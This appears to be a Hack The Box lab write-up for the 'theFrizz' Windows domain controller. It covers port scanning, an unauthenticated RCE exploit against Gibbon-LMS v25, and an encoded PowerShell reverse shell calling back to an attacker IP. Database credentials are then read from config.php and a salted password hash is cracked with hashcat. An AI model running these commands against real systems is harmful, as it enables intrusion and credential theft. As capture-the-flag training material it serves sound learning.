# theFrizz - HTB Writeup

**Target:** 10.129.232.168
**Domain:** frizz.htb
**Hostname:** FRIZZDC
**OS:** Windows Server (Domain Controller)
**Difficulty:** [TBD]

## Flags
- **User Flag:** [ ]
- **Root Flag:** [ ]

---

## Reconnaissance

### Initial Scan

**Ping Check**
```bash
ping -c 3 10.129.232.168
```
- TTL 127 → Windows target (128 - 1 hop)

**Port Scan**
```bash
nmap -p- --min-rate=3000 -vvv 10.129.232.168 -Pn -oN nmap/theFrizzNmapOpenPorts.txt
```

**Open Ports Found:**
- 22/tcp - SSH (OpenSSH for Windows 9.5) ⚠️ **UNUSUAL FOR DC**
- 53/tcp - DNS (Simple DNS Plus)
- 80/tcp - HTTP (Apache 2.4.58 + PHP 8.2.12) ⚠️ **UNUSUAL FOR DC**
- 88/tcp - Kerberos
- 135/tcp - MSRPC
- 139/tcp - NetBIOS-SSN
- 445/tcp - SMB (**Signing REQUIRED**)
- 464/tcp - kpasswd5
- 636/tcp - LDAPS
- 3268/tcp - Global Catalog LDAP
- 3269/tcp - Global Catalog LDAPS
- Plus high ports: 49667, 49670, 63668, 63672, 63687

**Service/Version Scan**
```bash
ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/theFrizzNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
nmap -p$ports -sSCV --min-rate=2000 10.129.232.168 -Pn -vvv -oN nmap/theFrizzNmapServicesVersions.txt
```

**Key Findings:**
- **Domain:** frizz.htb
- **Hostname:** FRIZZDC
- **HTTP Redirect:** http://frizzdc.frizz.htb/home/
- **Clock Skew:** +7 hours (important for Kerberos)
- **SMB Signing:** Enabled and REQUIRED (relay attacks blocked)

**Decision:** Apache + PHP on a DC is highly unusual → prioritize web application enumeration.

---

## Web Application Enumeration

### DNS Configuration
```bash
echo "10.129.232.168 frizz.htb frizzdc.frizz.htb" | sudo tee -a /etc/hosts
ping -c 1 frizzdc.frizz.htb  # Verify DNS resolution
```

### Initial Web Reconnaissance
```bash
curl -i http://frizzdc.frizz.htb
```
**Result:** 302 redirect to http://frizzdc.frizz.htb/home/

### Discovery: Gibbon-LMS
```bash
curl -i http://frizzdc.frizz.htb/Gibbon-LMS
```
**Result:** 301 redirect to /Gibbon-LMS/ (directory exists!)

**Gibbon-LMS = PHP-based Learning Management System**

### Version Identification
```bash
curl -L http://frizzdc.frizz.htb/Gibbon-LMS/ | tee logs/gibbon-homepage.html
curl -s http://frizzdc.frizz.htb/Gibbon-LMS/CHANGELOG.txt | head -20
```

**Identified Version:** Gibbon v25.0.00

**Flags/Notes:**
- Gibbon is open-source school management software
- Written in PHP → potential file upload, LFI, SQL injection vectors
- Version visible at bottom of login page and in CHANGELOG.txt

---

## Exploitation - Unauthenticated RCE

### CVE Research
```bash
searchsploit gibbon
```

**Finding:** Unauthenticated RCE vulnerability for Gibbon v25
**Exploit:** https://github.com/ulricvbs/gibbonlms-filewrite_rce

### Exploit Download
```bash
wget https://raw.githubusercontent.com/ulricvbs/gibbonlms-filewrite_rce/refs/heads/main/gibbonlms_cmd_shell.py
chmod +x gibbonlms_cmd_shell.py
```

### Initial Shell Access
```bash
./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
```

**Flags/Notes:**
- Exploit creates arbitrary file write → RCE
- **Pre-authentication exploit** (no credentials needed!)
- Provides basic command shell on target
- Running as web server user (likely `NT AUTHORITY\SYSTEM` or IIS APPPOOL user)
- Shell is functional but limited - upgrading to reverse shell for stability

---

## Shell Upgrade - Stable Reverse Shell

**Why upgrade?**
- Initial Gibbon command shell is basic and unstable
- Reverse shell provides better interactivity and stability
- Needed for complex operations (MySQL queries, file enumeration)

### Listener Setup (Attacker Machine)
```bash
rlwrap nc -lvnp 4444
```

**Flags/Notes:**
- `rlwrap` = adds readline support (arrow keys, command history)
- `-l` = listen mode
- `-v` = verbose output
- `-n` = no DNS resolution (faster)
- `-p 4444` = listen on port 4444

### Payload Generation

**Tool:** https://www.revshells.com

**Settings:**
- **IP:** 10.10.14.89 (attacker HTB VPN IP)
- **Port:** 4444
- **OS:** Windows
- **Payload Type:** PowerShell #3 (Base64)
- **Shell:** powershell
- **Encoding:** None

**Evidence:** Screenshot saved to `logs/windows reverse shell settings.png`

### Payload Execution

**From Gibbon command shell:**
```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

**Flags/Notes:**
- `-e` = execute base64-encoded command
- Base64 payload contains full reverse shell logic
- Creates TCP connection back to attacker on port 4444
- Provides interactive PowerShell prompt

**Result:** ✓ Stable reverse shell received on nc listener!

---

## Credential Harvesting

**All credential harvesting performed from stable reverse shell**

### Database Credentials - config.php

**Command** (from reverse shell)
```powershell
type C:\xampp\htdocs\Gibbon-LMS\config.php
```

**Credentials Found:**
- **Username:** MrGibbonsDB
- **Password:** MisterGibbs!Parrot!?1
- **Database:** MySQL (xampp installation)

**Flags/Notes:**
- XAMPP = Apache + MySQL + PHP + Perl for Windows
- Config file contains plaintext DB credentials
- Saved to `evidence/gibbonCreds.txt`

### MySQL Database Enumeration

**Command** (from reverse shell)
```bash
cd C:\xampp\mysql\bin
.\mysql.exe -u"MrGibbonsDB" -p'MisterGibbs!Parrot!?1' -e"use gibbon;select * from gibbonperson" 2>&1
```

**Flags/Notes:**
- Must navigate to MySQL bin directory first
- `-u` = username
- `-p` = password (no space between -p and password!)
- `-e` = execute SQL query
- `2>&1` = redirect errors to stdout
- Target table: `gibbonperson` (user accounts)
- **Note:** resetroot.bat shows root and pma passwords were deleted (found during enumeration)

**User Found:**
- **gibbonPersonID:** 0000000001
- **Name:** Fiona Frizzle (Ms. Frizzle)
- **Username:** f.frizzle
- **Email:** f.frizzle@frizz.htb
- **Password Hash:** 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
- **Salt:** /aACFhikmNopqrRTVz2489
- **Role:** Primary admin (gibbonRoleIDPrimary: 001)

**Evidence Saved:**
- Full database output: `evidence/gibbonCredsDB.txt`
- Hash for cracking: `evidence/gibbonCredsFull.txt`

---

## Password Cracking

### Hash Identification
```bash
hashcat gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
```

**Flags/Notes:**
- Running without `-m` flag → hashcat auto-detects hash mode
- **Identified Mode:** 1420 (SHA256 + salt)
- Format: `hash:salt`

### Hash Cracking
```bash
hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
```

**Flags/Notes:**
- `-m 1420` = SHA256($pass.$salt)
- Input file format: `067f746...b0c03:/aACFhikmNopqrRTVz2489`
- Wordlist: rockyou.txt (common passwords)
- `--force` = bypass warnings (usually for testing/CTF)

**Result:** ✓ **Password Cracked!**
- **User:** f.frizzle@frizz.htb
- **Password:** Jenni_Luvs_Magic23

---

## Current Status

**Access Gained:**
- ✓ RCE shell via Gibbon-LMS exploit
- ✓ MySQL database access (MrGibbonsDB user)
- ✓ Domain user credentials: **f.frizzle@frizz.htb / Jenni_Luvs_Magic23**

**Next Steps:**
1. Test f.frizzle credentials against Windows services:
   - SMB (port 445)
   - WinRM (port 5985/5986 - if enabled)
   - SSH (port 22)
   - RDP (check if port 3389 is open to f.frizzle)
2. Enumerate SMB shares with valid credentials
3. Check for user flag in f.frizzle's home directory
4. Enumerate Active Directory for privilege escalation paths

---

## Lessons Learned

1. **Unusual Services = High Priority:** Apache + PHP + SSH on a DC is abnormal → investigate first
2. **Version Identification is Critical:** CHANGELOG.txt, composer.json, page footers often reveal exact versions
3. **Pre-auth Exploits are Gold:** Gibbon v25 RCE required no credentials → instant foothold
4. **Shell Stability Matters:** Basic command shells work but unstable → upgrade to reverse shell for complex operations
5. **Config Files = Credential Goldmine:** config.php contained plaintext DB credentials
6. **Database Enumeration:** Application databases often store user credentials (even if hashed)
7. **Hash Format Matters:** SHA256 + salt requires specific hashcat mode (1420) and correct format (hash:salt)
8. **Email Format = Domain Username:** f.frizzle@frizz.htb likely maps to domain account

---

## Attack Chain

```
Web Enumeration → Gibbon-LMS v25.0.00 Discovery →
Unauthenticated RCE Exploit → Basic Command Shell →
Upgrade to Reverse Shell (PowerShell) → Stable Interactive Shell →
config.php Database Creds → MySQL Enumeration →
f.frizzle Hash Extraction → Hashcat Cracking →
Domain User Credentials: f.frizzle@frizz.htb / Jenni_Luvs_Magic23
```

**Branch Points:**
- **After finding Gibbon:** Could attempt default creds OR search for CVEs → chose CVE research (correct!)
- **After basic RCE:** Could use unstable shell OR upgrade to reverse shell → upgraded for stability (correct!)
- **After reverse shell:** Could upload tools OR enumerate with built-in commands → used built-in commands
- **After DB creds:** Could enumerate all tables OR target user tables → targeted gibbonperson (efficient!)

---

## Evidence Files

- `nmap/theFrizzNmapOpenPorts.txt` - Initial port scan
- `nmap/theFrizzNmapServicesVersions.txt` - Service/version scan
- `logs/gibbon-homepage.html` - Gibbon LMS homepage
- `logs/windows reverse shell settings.png` - Screenshot of revshells.com payload configuration
- `evidence/gibbonCreds.txt` - Database credentials
- `evidence/gibbonCredsDB.txt` - Full gibbonperson table dump
- `evidence/gibbonCredsFull.txt` - Hash file for cracking
- `loot/credentials.md` - Organized credential tracking
